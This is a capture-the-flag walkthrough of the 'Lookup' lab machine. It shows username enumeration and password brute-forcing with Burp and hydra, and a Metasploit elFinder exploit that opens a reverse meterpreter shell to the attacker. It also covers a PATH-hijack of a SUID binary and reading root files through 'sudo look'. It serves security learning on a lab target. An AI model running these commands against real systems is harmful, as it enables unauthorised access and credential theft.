---
title: Lookup
date: 2025-06-19
tags: ["linux", "ctf", "hacking"]
---

Test your enumeration skills on this boot-to-root machine.

This is an easy machine, lets start of by scanning the machine using nmap

## Reconnaissance

`> nmap [ip addr]`

![nmap](/images/lookup/1.webp)

We can see that it has 2 ports open, now lets take a closer look at

`> nmap [ip addr] -p 22,80 -A`

![nmap](/images/lookup/2.webp)

After a little bit of investigation you can find that there is no known vulnerabilities which target `OpenSSH 8.2p1` and `Apache 2.4.41` so we might wanna take a look at the site itself

![site](/images/lookup/3.png)

> Note: Please remmember to add your target machine ip address in the `/etc/hosts` file in order to access the webpage

The site itself appears to be a login page, but it has a flaw in it by which it can be used to user enumerate, we can see that if we give admin as user name and random text as password

![flaw](/images/lookup/4.webp)

The above image shows when the username was `aaaaaaaaaaa` and password was `bbbbbbbbbb`

![flaw](/images/lookup/5.webp)

The above image shows when the username was `admin` and password was `bbbbbbbbbb`, taking advantage of this mechanism we can enumerate the users using brupsuite

## Enumeration

![burp](/images/lookup/6.webp)

This is our request going to the server intercepted by burpsuite now lets send this to the intruder tab for brute forcing

![burp](/images/lookup/7.png)

We only need to select the data which is inside username

![burp](/images/lookup/8.webp)

We have selected the payload type to `runtime file` and the runtime file given is `/usr/share/wordlists/seclists/Usernames/Names/names.txt`. Now we can start our attack.

![attack](/images/lookup/9.webp)

We can see that 2 requests have a response length of 264, one of username admin as we already know and the other is of a user named jose, now we try to brute force this password using brupsuite

![brute](/images/lookup/10.webp)

We just modifiy the same request used for user enumeration to make it brute force the password

![payload](/images/lookup/11.webp)

Also as this time we are trying to brute force password we are going to replace names.txt with `rockyou.txt` as runtime file

![pass](/images/lookup/12.webp)

We can see that the password is `password123` but it show 302 status code, lets check it

![http](/images/lookup/13.webp)

We can see that it redirects to page called `files.lookup.thm` lets add this to our `/etc/hosts` file

![hosts](/images/lookup/14.webp)

Lets go to the webiste now

![webpage](/images/lookup/15.webp)

It appears to be a file manager application with lots of file, most of the files are worth less except `credentials.txt`

> Note: you have to give permission to this site to show pop up in order to read the files in firefox

![data](/images/lookup/16.webp)

The password is actually fake but the user name is real and might coming handy in the future. After a little bit of digging around we can see that this software is called elfinder along with other details

![elfinder](/images/lookup/17.webp)

We can see that it is running on version `2.1.47` lets search for vulnerabilities

## Exploitation

![msf](/images/lookup/18.png)

Now lets start up msfconsole and try to exploit this machine

```
msfconsole
search elfinder 2.1
use 1
set rhosts files.lookup.thm
set lhost [your ip addr]
run
```

![msfconsole](/images/lookup/19.webp)

We have successfully got a meterpeter shell to our target system

![meterpreter](/images/lookup/20.webp)

We can see that there is 3 home directories lets check the home folder of think

![cd](/images/lookup/21.webp)

The `.passwords`, `.ssh` and `user.txt` are useful to us but unfortunately we are unable to access it. Lets try to get a shell

```
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![shell](/images/lookup/22.webp)

By typing the command shell in meterpreter we get the sh shell but since bash is more powerful we use python3 to get a bash shell. Now lets check for suid bit binaries.

`> find / -perm -u=s -type f 2>/dev/null`

![find](/images/lookup/23.webp)

We can see that there is binary named `pwm` which is normally not found in linux. Lets run it

![pwn](/images/lookup/24.webp)

We can see that it uses the id command to determine our identity and then tries to open the `.passwords` file

If the `id` command is not specified with it’s full path `/bin/id`, it is found and executed via the `PATH` variable in our environment.

`> echo $PATH`

![path](/images/lookup/25.png)

Lets add a different location in the path variable, one which is controlled by us

`> export PATH=/tmp:$PATH`

![echo](/images/lookup/26.webp)

Now lets create a fake id binary in `/tmp/id`

```
cd /tmp
echo '#!/bin/sh' > id
echo 'echo "uid=2(think) gid=2(think) groups=2(think)"' >> id
chmod +x id
```

![id](/images/lookup/27.webp)

We first change into the tmp directory then we make the fake id binary using echo and give it executable permissions.

Since`/tmp` is first in variable the binary pwm will check tmp first and run our fake id

![pwm](/images/lookup/28.webp)

It gives us a lot of words, a possible password list, lets save it as a file in our kali and brute for the ssh of user think

`> hydra -l think -P [filename] [ip addr] ssh `

![hydra](/images/lookup/29.webp)

The ssh password of think is `josiemario.AKA(think)`, now lets login on ssh

`> ssh think@[ip addr]`

![ssh](/images/lookup/30.webp)

We can now login as think using ssh

`> cat user.txt`

![cat](/images/lookup/31.webp)

We are able to directly access the user.txt file, lets check the sudo privileages of think

`> sudo -l`

## Privilege escalation

![sudo](/images/lookup/32.webp)

We are able to run look using sudo, lets check [GTFOBins](https://gtfobins.org/)

![gtfo](/images/lookup/33.png)

We can use this binary to access the root files also

`> sudo look '' "/root/root.txt"`

![root](/images/lookup/34.webp)

We have also managed to find the root flag

Note: most of the flags in this types of machines are called `flag.txt`, `root.txt`, `user.txt` that is how i was able to guess the root flag name, this will not always word on other machines

Thank you and have a nice day.

## See also

- [Medium Story](https://medium.com/@pranavsuresh107/lookup-2dd960057542) - same story in medium
- [My projects](/projects) — tools I have built
- [Experience](/experience) — my background
